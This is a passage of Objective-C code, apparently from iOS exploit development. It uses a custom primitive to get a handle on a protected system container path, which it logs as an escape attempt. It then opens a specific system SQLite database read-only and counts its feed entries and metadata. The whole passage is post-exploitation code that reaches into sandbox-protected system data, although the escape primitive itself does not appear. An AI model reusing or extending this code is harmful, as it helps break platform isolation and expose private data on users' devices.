    LOG("[bq30] v177 arm cleanup + Siri window, %d s", secs);

    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
    LOG("[bq30] CONTROL §170 point -> handle %lld%s", (long long)h,
        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
    fsync(fileno(stderr));
    if (h < 0) { LOG("[bq30] done"); return; }

    NSString *dir = @"/var/containers/Data/System/"
        "8EB68272-6502-49E9-B688-25CA4774CFE4";
    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
    NSString *walp = [dbp stringByAppendingString:@"-wal"];
    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
    NSArray *files = @[ dbp, walp, shmPath ];
    struct stat st = {0};
    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
        LOG("[bq30] CONTROL db stat errno %d — target gone", errno);
        bad_query_release(h); LOG("[bq30] done"); return;
    }
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
                        NULL) != SQLITE_OK) {
        LOG("[bq30] CONTROL readonly open failed — aborting");
        if (db) sqlite3_close(db);
        bad_query_release(h); LOG("[bq30] done"); return;
    }
    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
    NSString *realBoot = nil;
